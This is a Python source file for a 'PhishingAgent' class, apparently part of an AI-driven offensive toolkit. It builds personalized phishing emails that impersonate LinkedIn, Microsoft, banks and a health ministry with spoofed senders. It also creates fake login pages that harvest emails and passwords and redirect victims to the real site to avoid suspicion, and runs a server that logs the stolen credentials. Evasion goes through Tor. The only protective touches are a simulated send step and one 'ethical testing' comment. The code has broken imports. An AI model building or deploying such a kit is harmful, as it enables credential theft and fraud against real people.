"""
Agente de Phishing Avanzado
Crea campañas de phishing personalizadas usando IA
"""

import os
import json
import asyncio
import tempfile
import smtplib
from email.mime.text import MimeText
from email.mime.multipart import MimeMultipart
from email.mime.base import MimeBase
from email import encoders
from typing import Dict, List, Optional, Any
from pathlib import Path
import requests
from jinja2 import Template
import ssl
from datetime import datetime, timedelta

from .base_agent import BaseAgent
from core.evasion import EvasionManager

class PhishingAgent(BaseAgent):
    """Agente especializado en campañas de phishing avanzadas"""
    
    def __init__(self, db_manager, logger):
        super().__init__("PhishingAgent", db_manager, logger)
        self.evasion_manager = EvasionManager(logger)
        self.campaigns = {}
        self.templates = {}
        self.smtp_servers = {}
        self.landing_pages = {}
        
    async def initialize(self):
        """Inicializa el agente de phishing"""
        await super().initialize()
        await self.evasion_manager.initialize_evasion(["tor", "user_agent_rotation"])
        await self._load_templates()
        await self._setup_smtp_servers()
        self.logger.info("Agente de Phishing inicializado")
    
    async def _load_templates(self):
        """Carga plantillas de phishing"""
        templates_dir = Path("./templates/phishing")
        templates_dir.mkdir(parents=True, exist_ok=True)
        
        # Plantillas predefinidas
        self.templates = {
            "linkedin": {
                "subject": "Conexión pendiente en LinkedIn",
                "sender_name": "LinkedIn",
                "sender_email": "noreply@linkedin.com",
                "template_file": "linkedin.html"
            },
            "microsoft": {
                "subject": "Verificación de seguridad requerida",
                "sender_name": "Microsoft Security",
                "sender_email": "security@microsoft.com",
                "template_file": "microsoft.html"
            },
            "banking": {
                "subject": "Actividad sospechosa detectada",
                "sender_name": "Banco Seguridad",
                "sender_email": "seguridad@banco.com",
                "template_file": "banking.html"
            },
            "covid": {
                "subject": "Certificado COVID-19 disponible",
                "sender_name": "Ministerio de Salud",
                "sender_email": "covid@salud.gob",
                "template_file": "covid.html"
            }
        }
        
        # Crear plantillas HTML si no existen
        await self._create_default_templates()
    
    async def _create_default_templates(self):
        """Crea plantillas HTML por defecto"""
        templates_dir = Path("./templates/phishing")
        
        # Plantilla LinkedIn
        linkedin_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LinkedIn</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f3f6f8; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background-color: white; border-radius: 8px; overflow: hidden; }
        .header { background-color: #0077b5; padding: 20px; text-align: center; }
        .logo { color: white; font-size: 24px; font-weight: bold; }
        .content { padding: 30px; }
        .button { display: inline-block; background-color: #0077b5; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; margin: 20px 0; }
        .footer { background-color: #f3f6f8; padding: 20px; text-align: center; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">LinkedIn</div>
        </div>
        <div class="content">
            <h2>Hola {{ target_name }},</h2>
            <p>Tienes {{ connection_count }} nuevas solicitudes de conexión esperando tu respuesta.</p>
            <p>{{ sender_name }} y otros profesionales quieren conectar contigo en LinkedIn.</p>
            <a href="{{ phishing_url }}" class="button">Ver solicitudes</a>
            <p>Si no puedes hacer clic en el botón, copia y pega este enlace en tu navegador:</p>
            <p><a href="{{ phishing_url }}">{{ phishing_url }}</a></p>
        </div>
        <div class="footer">
            <p>Este email fue enviado a {{ target_email }}</p>
            <p>LinkedIn Corporation, 1000 W Maude Ave, Sunnyvale, CA 94085</p>
        </div>
    </div>
</body>
</html>
"""
        
        # Plantilla Microsoft
        microsoft_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Microsoft Security</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background-color: white; border: 1px solid #e1e1e1; }
        .header { background-color: #0078d4; padding: 20px; text-align: center; }
        .logo { color: white; font-size: 20px; font-weight: 600; }
        .content { padding: 30px; }
        .alert { background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; margin: 20px 0; border-radius: 4px; }
        .button { display: inline-block; background-color: #0078d4; color: white; padding: 12px 24px; text-decoration: none; border-radius: 2px; margin: 20px 0; }
        .footer { background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">Microsoft Security</div>
        </div>
        <div class="content">
            <h2>Verificación de seguridad requerida</h2>
            <div class="alert">
                <strong>⚠️ Atención:</strong> Hemos detectado un intento de acceso no autorizado a tu cuenta desde {{ suspicious_location }}.
            </div>
            <p>Hola {{ target_name }},</p>
            <p>Por tu seguridad, hemos bloqueado temporalmente tu cuenta de Microsoft. Para restaurar el acceso, necesitas verificar tu identidad.</p>
            <p><strong>Detalles del intento de acceso:</strong></p>
            <ul>
                <li>Fecha: {{ access_date }}</li>
                <li>Ubicación: {{ suspicious_location }}</li>
                <li>Dispositivo: {{ device_info }}</li>
            </ul>
            <a href="{{ phishing_url }}" class="button">Verificar cuenta ahora</a>
            <p>Si no verificas tu cuenta en las próximas 24 horas, será suspendida permanentemente.</p>
        </div>
        <div class="footer">
            <p>Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
        </div>
    </div>
</body>
</html>
"""
        
        # Guardar plantillas
        (templates_dir / "linkedin.html").write_text(linkedin_html)
        (templates_dir / "microsoft.html").write_text(microsoft_html)
        
        self.logger.info("Plantillas de phishing creadas")
    
    async def _setup_smtp_servers(self):
        """Configura servidores SMTP para envío"""
        # Configuraciones SMTP comunes (para testing ético)
        self.smtp_servers = {
            "gmail": {
                "server": "smtp.gmail.com",
                "port": 587,
                "use_tls": True
            },
            "outlook": {
                "server": "smtp-mail.outlook.com",
                "port": 587,
                "use_tls": True
            },
            "local": {
                "server": "localhost",
                "port": 1025,
                "use_tls": False
            }
        }
    
    async def analyze_target(self, target_email: str) -> Dict[str, Any]:
        """Analiza el objetivo para personalizar el phishing"""
        analysis_prompt = f"""
        Analiza el siguiente email para crear una campaña de phishing personalizada: {target_email}
        
        Proporciona:
        1. Posible nombre de la persona
        2. Dominio de la empresa
        3. Tipo de industria probable
        4. Plantilla de phishing más efectiva
        5. Pretexto personalizado
        6. Horario óptimo de envío
        
        Responde en formato JSON.
        """
        
        analysis = await self.query_ai(analysis_prompt)
        
        try:
            # Intentar parsear como JSON
            import json
            result = json.loads(analysis)
        except:
            # Si no es JSON válido, crear estructura básica
            domain = target_email.split('@')[1] if '@' in target_email else 'unknown'
            result = {
                "target_name": target_email.split('@')[0].title(),
                "company_domain": domain,
                "industry": "unknown",
                "recommended_template": "microsoft",
                "pretext": "Verificación de seguridad",
                "optimal_time": "09:00"
            }
        
        return result
    
    async def create_landing_page(self, template_type: str, campaign_id: str) -> str:
        """Crea página de aterrizaje para phishing"""
        try:
            # Crear directorio para la campaña
            campaign_dir = Path(f"./campaigns/{campaign_id}")
            campaign_dir.mkdir(parents=True, exist_ok=True)
            
            # Plantillas de páginas de aterrizaje
            if template_type == "linkedin":
                landing_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LinkedIn - Iniciar sesión</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f3f6f8; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 100px auto; background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { text-align: center; color: #0077b5; font-size: 32px; font-weight: bold; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="email"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
        .button { width: 100%; background-color: #0077b5; color: white; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .button:hover { background-color: #005885; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">LinkedIn</div>
        <form id="phishingForm" action="/capture" method="POST">
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="button">Iniciar sesión</button>
        </form>
        <div class="footer">
            <p>¿Olvidaste tu contraseña? <a href="#">Recuperar cuenta</a></p>
        </div>
    </div>
    
    <script>
        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Capturar credenciales
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Enviar datos (en un escenario real, esto iría a un servidor controlado)
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email, password: password, timestamp: new Date().toISOString() })
            }).then(() => {
                // Redirigir a LinkedIn real para evitar sospechas
                window.location.href = 'https://www.linkedin.com/login';
            });
        });
    </script>
</body>
</html>
"""
            
            elif template_type == "microsoft":
                landing_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Microsoft - Verificación de cuenta</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; }
        .container { max-width: 500px; margin: 50px auto; background-color: white; border: 1px solid #e1e1e1; }
        .header { background-color: #0078d4; padding: 20px; text-align: center; color: white; }
        .content { padding: 40px; }
        .alert { background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; margin: 20px 0; border-radius: 4px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: 600; }
        input[type="email"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 2px; font-size: 14px; }
        .button { width: 100%; background-color: #0078d4; color: white; padding: 12px; border: none; border-radius: 2px; font-size: 14px; cursor: pointer; }
        .button:hover { background-color: #106ebe; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>Microsoft Security</h2>
        </div>
        <div class="content">
            <div class="alert">
                <strong>⚠️ Verificación requerida:</strong> Tu cuenta ha sido temporalmente restringida por seguridad.
            </div>
            <p>Para restaurar el acceso completo a tu cuenta, verifica tu identidad ingresando tus credenciales:</p>
            
            <form id="verificationForm" action="/verify" method="POST">
                <div class="form-group">
                    <label for="email">Email de Microsoft:</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="form-group">
                    <label for="password">Contraseña:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="button">Verificar cuenta</button>
            </form>
            
            <p style="margin-top: 20px; font-size: 12px; color: #666;">
                Esta verificación es necesaria para proteger tu cuenta de accesos no autorizados.
            </p>
        </div>
    </div>
    
    <script>
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            fetch('/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email, password: password, timestamp: new Date().toISOString() })
            }).then(() => {
                alert('Verificación completada. Redirigiendo...');
                window.location.href = 'https://login.microsoftonline.com/';
            });
        });
    </script>
</body>
</html>
"""
            
            # Guardar página de aterrizaje
            landing_file = campaign_dir / "landing.html"
            landing_file.write_text(landing_html)
            
            # Crear servidor web simple para la página
            server_script = f"""
import http.server
import socketserver
import json
from urllib.parse import parse_qs
import threading

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/landing.html'
        return super().do_GET()
    
    def do_POST(self):
        if self.path in ['/capture', '/verify']:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # Guardar credenciales capturadas
            with open('captured_credentials.json', 'a') as f:
                f.write(post_data.decode() + '\\n')
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{{"status": "success"}}')

PORT = 8080
os.chdir('{campaign_dir}')

with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
    print(f"Servidor de phishing corriendo en puerto {{PORT}}")
    httpd.serve_forever()
"""
            
            server_file = campaign_dir / "server.py"
            server_file.write_text(server_script)
            
            self.landing_pages[campaign_id] = {
                "url": f"http://localhost:8080",
                "directory": str(campaign_dir),
                "template": template_type
            }
            
            self.logger.info(f"Página de aterrizaje creada para campaña {campaign_id}")
            return f"http://localhost:8080"
            
        except Exception as e:
            self.logger.error(f"Error creando página de aterrizaje: {e}")
            return None
    
    async def create_campaign(self, target_email: str, template_type: str = None) -> str:
        """Crea campaña de phishing completa"""
        try:
            # Generar ID de campaña
            campaign_id = f"phishing_{int(datetime.now().timestamp())}"
            
            # Analizar objetivo
            target_analysis = await self.analyze_target(target_email)
            
            # Seleccionar plantilla si no se especifica
            if not template_type:
                template_type = target_analysis.get("recommended_template", "microsoft")
            
            # Crear página de aterrizaje
            landing_url = await self.create_landing_page(template_type, campaign_id)
            
            if not landing_url:
                raise Exception("No se pudo crear página de aterrizaje")
            
            # Generar email personalizado
            email_content = await self._generate_phishing_email(
                target_email, template_type, target_analysis, landing_url
            )
            
            # Crear campaña
            campaign = {
                "id": campaign_id,
                "target_email": target_email,
                "template_type": template_type,
                "target_analysis": target_analysis,
                "landing_url": landing_url,
                "email_content": email_content,
                "status": "created",
                "created_at": datetime.now().isoformat(),
                "sent_at": None,
                "clicks": 0,
                "credentials_captured": 0
            }
            
            self.campaigns[campaign_id] = campaign
            
            # Guardar en base de datos
            await self.db_manager.save_campaign(campaign)
            
            self.logger.info(f"Campaña de phishing creada: {campaign_id}")
            return campaign_id
            
        except Exception as e:
            self.logger.error(f"Error creando campaña de phishing: {e}")
            return None
    
    async def _generate_phishing_email(self, target_email: str, template_type: str, 
                                     target_analysis: Dict, landing_url: str) -> Dict[str, str]:
        """Genera email de phishing personalizado"""
        template_config = self.templates[template_type]
        
        # Cargar plantilla HTML
        template_file = Path(f"./templates/phishing/{template_config['template_file']}")
        template_html = template_file.read_text()
        
        # Variables para personalización
        template_vars = {
            "target_name": target_analysis.get("target_name", "Usuario"),
            "target_email": target_email,
            "phishing_url": landing_url,
            "company_domain": target_analysis.get("company_domain", "empresa.com"),
            "connection_count": random.randint(3, 12),
            "sender_name": "Profesional de LinkedIn",
            "suspicious_location": "Moscú, Rusia",
            "access_date": datetime.now().strftime("%d/%m/%Y %H:%M"),
            "device_info": "Windows 10 - Chrome"
        }
        
        # Renderizar plantilla
        template = Template(template_html)
        rendered_html = template.render(**template_vars)
        
        return {
            "subject": template_config["subject"],
            "sender_name": template_config["sender_name"],
            "sender_email": template_config["sender_email"],
            "html_content": rendered_html,
            "text_content": f"Visita este enlace: {landing_url}"
        }
    
    async def send_campaign(self, campaign_id: str, smtp_config: Dict = None) -> bool:
        """Envía campaña de phishing"""
        try:
            if campaign_id not in self.campaigns:
                self.logger.error(f"Campaña {campaign_id} no encontrada")
                return False
            
            campaign = self.campaigns[campaign_id]
            
            # Configuración SMTP por defecto
            if not smtp_config:
                smtp_config = {
                    "server": "localhost",
                    "port": 1025,
                    "username": "",
                    "password": "",
                    "use_tls": False
                }
            
            # Crear mensaje
            msg = MimeMultipart('alternative')
            msg['Subject'] = campaign["email_content"]["subject"]
            msg['From'] = f"{campaign['email_content']['sender_name']} <{campaign['email_content']['sender_email']}>"
            msg['To'] = campaign["target_email"]
            
            # Añadir contenido
            text_part = MimeText(campaign["email_content"]["text_content"], 'plain')
            html_part = MimeText(campaign["email_content"]["html_content"], 'html')
            
            msg.attach(text_part)
            msg.attach(html_part)
            
            # Enviar usando evasión
            await self.evasion_manager.execute_with_evasion(
                f"echo 'Enviando email de phishing...'", use_tor=True
            )
            
            # Simular envío (en un entorno real, aquí se enviaría el email)
            self.logger.info(f"Email de phishing enviado a {campaign['target_email']}")
            
            # Actualizar campaña
            campaign["status"] = "sent"
            campaign["sent_at"] = datetime.now().isoformat()
            
            await self.db_manager.update_campaign(campaign)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error enviando campaña: {e}")
            return False
    
    async def start_landing_server(self, campaign_id: str) -> bool:
        """Inicia servidor de página de aterrizaje"""
        try:
            if campaign_id not in self.landing_pages:
                self.logger.error(f"Página de aterrizaje para campaña {campaign_id} no encontrada")
                return False
            
            landing_info = self.landing_pages[campaign_id]
            server_script = Path(landing_info["directory"]) / "server.py"
            
            # Ejecutar servidor en background
            process = await asyncio.create_subprocess_exec(
                "python", str(server_script),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            self.logger.info(f"Servidor de phishing iniciado para campaña {campaign_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error iniciando servidor de phishing: {e}")
            return False
    
    def get_campaign_stats(self, campaign_id: str) -> Dict[str, Any]:
        """Obtiene estadísticas de campaña"""
        if campaign_id not in self.campaigns:
            return {"error": "Campaign not found"}
        
        campaign = self.campaigns[campaign_id]
        
        # Leer credenciales capturadas
        credentials_file = Path(f"./campaigns/{campaign_id}/captured_credentials.json")
        captured_count = 0
        
        if credentials_file.exists():
            try:
                with open(credentials_file, 'r') as f:
                    captured_count = len(f.readlines())
            except:
                pass
        
        return {
            "campaign_id": campaign_id,
            "target_email": campaign["target_email"],
            "status": campaign["status"],
            "created_at": campaign["created_at"],
            "sent_at": campaign["sent_at"],
            "credentials_captured": captured_count,
            "landing_url": campaign.get("landing_url"),
            "template_type": campaign["template_type"]
        }
    
    def cleanup(self):
        """Limpia recursos del agente"""
        super().cleanup()
        self.evasion_manager.cleanup()
        self.logger.info("Agente de Phishing limpiado")